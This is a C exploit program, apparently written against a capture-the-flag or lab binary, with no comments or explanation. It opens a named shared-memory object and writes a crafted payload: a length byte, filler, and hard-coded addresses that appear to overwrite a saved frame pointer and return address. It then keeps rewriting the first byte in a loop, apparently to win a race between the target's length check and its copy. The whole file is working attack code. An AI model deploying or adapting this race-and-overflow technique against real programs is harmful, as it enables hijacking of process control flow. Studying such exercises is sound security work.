#include <fcntl.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/mman.h>
#include <sys/stat.h>
#include <unistd.h>

int main(int argc, char **argv) {
    if (argc != 2) {
        fprintf(stderr, "Usage: %s <name>\n", argv[0]);
        exit(1);
    }

    char *name = argv[1];
    int fd = -1;
    do {
        fd = shm_open(name, O_RDWR, S_IRWXU | S_IRWXG | S_IRWXO);
    } while (fd == -1);

    char payload[] = "\xc0"
                     "\x00"
                     "aaaaaaaa"
                     "aaaaaaaa"
                     "aaaaaaaa"
                     "aaaaaaaa"
                     "aaaaaaaa"
                     "aaaaaaaa"
                     "aaaaaaaa"
                     "aaaaaaaa"
                     "aaaaaaaa"
                     "aaaaaaaa"
                     "aaaaaaaa"
                     "aaaaaaaa"
                     "aaaaaaaa"
                     "aaaaaaaa"
                     "aaaaaaaa"
                     "aaaaaaaa"
                     "aaaaaaaa"
                     "\x00\x48\x40\x00\x00\x00\x00\x00"
                     "aaaaaaaa"
                     "aaaaaaaa"
                     "\x00\x48\x40\x00\x00\x00\x00\x00"
                     "\x4c\x12\x40\x00\x00\x00\x00\x00";
    lseek(fd, 0, SEEK_SET);
    write(fd, payload, sizeof(payload));
    while (1) {
        lseek(fd, 0, SEEK_SET);
        write(fd, payload, 1);
    }
    return 0;
}
